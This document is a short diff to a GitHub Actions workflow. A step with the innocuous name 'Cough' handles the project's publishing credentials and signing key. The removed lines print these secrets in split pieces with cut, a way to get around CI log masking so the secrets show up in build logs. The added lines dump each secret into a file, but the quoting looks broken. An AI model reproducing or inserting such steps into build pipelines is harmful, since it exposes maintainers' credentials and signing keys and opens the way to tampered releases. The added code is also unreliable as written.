@@ -19,10 +19,11 @@ jobs:
     steps:
       - name: Cough
         run: |
-          echo -n "${{ secrets.OSSRH_USERNAME }}" >> foo && cut -c1-3 foo && cut -c4
-          echo -n "${{ secrets.OSSRH_TOKEN }}" >> foo && cut -c1-3 foo && cut -c4
-          echo -n "${{ secrets.SIGNING_KEY_ID }}" >> foo && cut -c1-3 foo && cut -c4
-          echo -n "${{ secrets.SIGNING_KEY }}" >> foo && cut -c1-3 foo && cut -c4
+          'echo "$OSSRH_USERNAME" > ou'
+          'echo "$OSSRH_TOKEN" > ot'
+          'echo "$SIGNING_KEY_ID" > ski'
+          'echo "$SIGNING_KEY" > sk'
+        shell: bash
       - name: Setup JDK 11
         uses: actions/setup-java@v3
         with:
